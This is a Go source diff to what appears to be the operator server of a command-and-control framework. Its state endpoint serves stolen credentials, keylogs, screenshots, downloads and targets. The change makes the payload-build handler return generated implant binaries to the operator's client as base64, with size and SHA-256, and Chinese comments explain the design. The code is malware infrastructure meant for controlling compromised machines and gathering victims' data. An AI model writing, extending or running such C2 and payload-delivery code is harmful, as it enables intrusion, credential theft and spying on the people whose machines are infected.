@@ -5,6 +5,7 @@ package main
 
 import (
 	"crypto/sha256"
+	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
@@ -111,17 +112,17 @@ func handleListeners(w http.ResponseWriter, r *http.Request) {
 func handleState(w http.ResponseWriter, r *http.Request) {
 	rows := sessionsRows()
 	writeJSON(w, map[string]interface{}{
-		"ok":          true,
-		"host":        serverAddr,
-		"proto_v2":    true,
-		"sessions":    rows,
-		"listeners":   listenerList(),
-		"credentials": storeCreds(),
-		"downloads":   storeDownloads(),
-		"screenshots": storeScreenshots(),
-		"keylogs":     storeKeylogs(),
-		"events":      storeEvents(300),
-		"profile":     currentProfileName(),
+		"ok":             true,
+		"host":           serverAddr,
+		"proto_v2":       true,
+		"sessions":       rows,
+		"listeners":      listenerList(),
+		"credentials":    storeCreds(),
+		"downloads":      storeDownloads(),
+		"screenshots":    storeScreenshots(),
+		"keylogs":        storeKeylogs(),
+		"events":         storeEvents(300),
+		"profile":        currentProfileName(),
 		"profile_detail": profileSummary(),
 		"targets":        storeTargets(),
 		"proxy":          proxyList(),
@@ -374,11 +375,17 @@ func handlePayloadBuild(w http.ResponseWriter, r *http.Request) {
 	if SupportsNative(req.Format) {
 		// xform 传空: 变换链由 Malleable profile 在服务端侧决定,
 		// 生成请求里没有这个字段, PatchConfig 会填默认的 "raw"。
-		logText, nerr := buildPayloadNative(req.Format, req.Host, req.Port, req.SSL,
+		logText, blob, nerr := buildPayloadNative(req.Format, req.Host, req.Port, req.SSL,
 			req.URI, req.Sleep, req.Jitter, "", req.Password, req.OutFile, devRoot)
 		eventLog("operator", "", "生成载荷",
 			req.Format+" "+req.Host+":"+strconv.Itoa(req.Port))
-		writeJSON(w, map[string]interface{}{
+
+		// **产物以 base64 随响应回传**, 由客户端落盘到自己本机。
+		//
+		// 为什么必须这样: 服务端常常跑在远程 VPS 上, 它写自己磁盘 = 产物留在那台机器,
+		// 客户端根本拿不到。模板最大 113 KB, base64 后约 151 KB, 单次响应完全能承受,
+		// 也就省掉了"先建令牌再取件"那一套往返与状态管理。
+		resp := map[string]interface{}{
 			"ok":     nerr == nil,
 			"log":    logText,
 			"error":  errStr(nerr),
@@ -386,7 +393,15 @@ func handlePayloadBuild(w http.ResponseWriter, r *http.Request) {
 			"format": req.Format,
 			"ps":     "",
 			"gen":    "内置生成器",
-		})
+		}
+		if nerr == nil && len(blob) > 0 {
+			sum := sha256.Sum256(blob)
+			resp["size"] = len(blob)
+			resp["sha256"] = hex.EncodeToString(sum[:])
+			resp["file"] = fmt.Sprintf("%s_%s_%d%s", req.Format, req.Host, req.Port, extOf(req.Format))
+			resp["data_b64"] = base64.StdEncoding.EncodeToString(blob)
+		}
+		writeJSON(w, resp)
 		return
 	}
 
@@ -460,13 +475,13 @@ func handlePayloadBuild(w http.ResponseWriter, r *http.Request) {
 	// 统一兜底转成 UTF-8, 否则 JSON 里会出现一片 U+FFFD。
 	logText := string(ensureUTF8(out))
 	writeJSON(w, map[string]interface{}{
-		"ok":       err == nil,
-		"log":      logText,
-		"error":    errStr(err),
-		"out":      req.OutFile,
-		"format":   req.Format,
-		"ps":       psExe,
-		"gen":      filepath.Base(script),
+		"ok":     err == nil,
+		"log":    logText,
+		"error":  errStr(err),
+		"out":    req.OutFile,
+		"format": req.Format,
+		"ps":     psExe,
+		"gen":    filepath.Base(script),
 	})
 }
 
